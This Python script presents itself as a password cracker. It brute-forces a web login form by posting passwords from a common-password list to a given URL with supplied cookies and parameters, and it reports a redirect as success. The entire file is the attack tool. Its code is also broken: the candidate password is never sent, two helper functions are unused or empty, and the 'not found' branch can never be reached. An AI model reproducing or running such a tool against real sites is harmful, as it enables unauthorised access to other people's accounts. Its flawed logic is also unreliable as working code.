from http.client import HTTPResponse
import sys
import requests
import re
import json
import ast

def main():
    argcounter = 0
    params = {}
    cookies = {}
    for argcounter in range(1,len(sys.argv)):
        argtag = sys.argv[argcounter]
        print(argtag)
        if argtag == "-h":
            print("Welcome to Sneeblys Password Cracker")
            print("-c <name:value>  Cookies")
            print("-p <name:value>  Post Parameters")
            print("-u <url>  URL")
            break
        try: 
            arg = sys.argv[argcounter+1]
        except:
            break
        if argtag == "-u":
            url = arg
        if argtag == "-p":
            x = arg.split(":")
            params[x[0]] = x[1]
        if argtag == "-c":
            x = arg.split(":")
            cookies[x[0]] = x[1]
            
    bruteforce(url,cookies,params)
    
    
def searchformiddleware(input):
        x = input.text
        inputtag = re.search(r"<input type=\"hidden\" name=\"csrfmiddlewaretoken\" value=\"[^\"]*\">",x)
        valuelist = re.findall(r"\"[^\"]*\"",inputtag.group())
        mwt = valuelist[2]
        mwt =mwt.strip('\"')
        return mwt


def getcookie(req):
    csrftoken = req.cookies.get("csrftoken")


def bruteforce(url,cookies,parameters):
    filez = open("1000-most-common-passwords.txt","r")
    passworddict =filez.readlines()
    counter = 0
    while (counter < len(passworddict)):
        password = passworddict[counter].strip()
        print("Trying Password: "+ password)
        headers = {'Content-type': 'application/x-www-form-urlencoded'}
        submitform = requests.post(headers=headers,url=url,cookies=cookies,data=parameters)
        counter = counter + 1
        if submitform.status_code == 302:
            print("SUCCESSSSSSSSSSSSSSSSSSSSSSS")
            print("Password is    " + password)
            break
    if  len(passworddict)<counter:
        print("password not found")

main()


